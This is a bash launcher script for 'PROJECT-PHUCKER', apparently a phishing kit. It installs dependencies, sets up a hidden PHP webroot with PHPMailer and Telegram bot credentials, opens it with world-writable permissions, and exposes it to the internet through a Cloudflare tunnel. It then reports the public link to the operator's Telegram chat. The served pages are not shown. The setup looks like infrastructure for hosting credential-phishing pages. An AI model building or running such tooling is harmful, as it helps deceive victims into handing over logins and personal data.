#!/bin/bash

# Banner for PROJECT-PHUCKER
echo "==============================="
echo "       PROJECT-PHUCKER         "
echo "==============================="

# Function to install required packages
install_packages() {
    echo -e "\n[+] Installing required packages..."

    # Check if running on Android
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if ! command -v proot &> /dev/null; then
            echo -e "[+] Installing package: proot"
            pkg install proot resolv-conf -y
        fi
    fi

    # Check for essential packages
    if ! command -v php &> /dev/null || ! command -v wget &> /dev/null || ! command -v curl &> /dev/null || ! command -v unzip &> /dev/null; then
        echo -e "[+] Installing required packages..."
        
        if command -v pkg &> /dev/null; then
            pkg install php wget curl unzip -y
        elif command -v apt-get &> /dev/null; then
            apt-get install php wget curl unzip -y
        elif command -v pacman &> /dev/null; then
            sudo pacman -S php wget curl unzip --noconfirm
        elif command -v dnf &> /dev/null; then
            sudo dnf -y install php wget curl unzip
        else
            echo -e "[!] Unsupported package manager. Install packages manually."
            exit 1
        fi
    else
        echo -e "[+] Mip packages already installed."
    fi

    # Check if Composer is installed, if not install it
    if ! command -v composer &> /dev/null; then
        echo -e "\n[+] Installing Composer..."
        php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
        php composer-setup.php --install-dir=/usr/local/bin --filename=composer
        php -r "unlink('composer-setup.php');"
    else
        echo -e "[+] Composer already installed."
    fi
}

# Function to create necessary files and install dependencies to webroot
create_files_and_install_dependencies() {
    echo -e "\n[+] Creating necessary files and installing dependencies to webroot..."

    # Check if .www directory exists, create if not
    if [[ ! -d ".www" ]]; then
        mkdir .www
    fi

    # Check if config.ini exists in .www folder, create if not
    if [[ ! -f ".www/config.ini" ]]; then
        echo -e "\n[+] Creating config.ini in .www folder..."
        cat <<EOF > .www/config.ini
token = your_telegram_bot_token
chat_id = your_telegram_chat_id
EOF
    else
        echo -e "[+] config.ini already exists."
    fi

    # Install PHPMailer to .www folder if not already installed
    if [[ ! -d ".www/vendor" ]]; then
        echo -e "\n[+] Installing PHPMailer to .www folder..."
        cd .www
        composer require phpmailer/phpmailer
        cd ..
    else
        echo -e "[+] PHPMailer already installed."
    fi
}

# Function to set permissions
set_permissions() {
    echo -e "\n[+] Setting permissions..."

    # Ensure .tunnels_log directory exists
    mkdir -p .tunnels_log

    # Set permissions for necessary files and directories
    chmod -R 777 .www .tunnels_log
}

# Function to start server
setup_and_start_server() {
    echo -e "\n[+] Setting up and starting server..."

    # Start PHP server
    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    echo "[+] PHP server started at http://127.0.0.1:8080"
}

# Function to start Cloudflared tunnel
start_cloudflared() {
    echo -e "\n[+] Starting Cloudflared..."

    if [[ $(command -v termux-chroot) ]]; then
        termux-chroot ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    else
        ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    fi

    sleep 12

    # Retrieve Cloudflared URL from log
    if [[ -f .tunnels_log/.cloudfl.log ]]; then
        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
        echo -e "\n[+] Cloudflared URL: ${cldflr_url}"

        # Check if config.ini exists in .www folder and send URL to Telegram if configured
        if [[ -f .www/config.ini ]]; then
            TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
            TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage -d text="Cloudflared URL: ${cldflr_url}" -d chat_id=${TELEGRAM_CHAT_ID} > /dev/null
        else
            echo "[-] config.ini not found in .www folder. Cannot send URL to Telegram."
        fi
    else
        echo "[-] .tunnels_log/.cloudfl.log not found. Cloudflared URL retrieval failed."
    fi
}

# Main script execution
install_packages
create_files_and_install_dependencies
set_permissions
setup_and_start_server
start_cloudflared
